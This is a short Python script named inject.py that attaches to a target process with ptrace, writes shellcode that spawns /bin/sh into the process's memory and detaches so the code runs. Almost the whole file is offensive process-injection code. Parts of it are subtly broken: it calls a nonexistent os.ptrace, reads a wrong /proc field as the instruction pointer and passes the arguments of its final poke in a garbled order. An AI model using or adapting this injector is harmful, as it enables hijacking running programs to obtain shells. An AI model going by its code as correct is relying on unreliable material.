import ctypes
import sys
import os
import struct
import subprocess

SHELLCODE_SIZE = 32

shellcode = (
    "\x48\x31\xc0\x48\x89\xc2\x48\x89"
    "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
    "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
    "\x2f\x73\x68\x00\xcc\x90\x90\x90"
)

def inject_data(pid, src, dst, size):
    libc = ctypes.CDLL('libc.so.6')
    offset = 0
    for i in xrange(0, size, 4):
        data = struct.unpack("<I", src[offset:offset+4])[0]
        if libc.ptrace(5, pid, ctypes.c_void_p(dst + offset), ctypes.c_void_p(data), 0) < 0:
            print("ptrace error")
            return -1
        offset += 4
    return 0

def main():
    if len(sys.argv) != 2:
        print("Usage: python inject.py <pid>")
        sys.exit(1)

    target_pid = int(sys.argv[1])

    print("+ Tracing process %d" % target_pid)

    ret = os.ptrace('PTRACE_ATTACH', target_pid, 0, 0)
    if ret < 0:
        print("ptrace(ATTACH) error")
        sys.exit(1)

    print("+ Waiting for process...")
    os.wait()

    print("+ Getting Registers")
    with open("/proc/%d/status" % target_pid) as status_file:
        for line in status_file:
            if line.startswith("Pid:"):
                break
        else:
            print("Unable to get PID from /proc")
            sys.exit(1)
    
    rip_address = None
    with open("/proc/%d/stat" % target_pid) as stat_file:
        stat_data = stat_file.read()
        rip_index = stat_data.rfind(') ')
        if rip_index != -1:
            stat_data = stat_data[rip_index + 2:]
            fields = stat_data.split(' ')
            if len(fields) > 13:
                rip_address = int(fields[13])

    if rip_address is None:
        print("Unable to extract RIP address")
        sys.exit(1)

    print("+ Injecting shell code at %p" % rip_address)
    inject_data(target_pid, shellcode, rip_address, SHELLCODE_SIZE)

    rip_address += 2
    print("+ Setting instruction pointer to %p" % rip_address)

    ret = os.ptrace('PTRACE_POKETEXT', target_pid, 0x6f732f6e69622f2f, rip_address)
    if ret < 0:
        print("ptrace(POKETEXT) error")
        sys.exit(1)

    print("+ Run it!")

    ret = os.ptrace('PTRACE_DETACH', target_pid, 0, 0)
    if ret < 0:
        print("ptrace(DETACH) error")
        sys.exit(1)

if __name__ == "__main__":
    main()
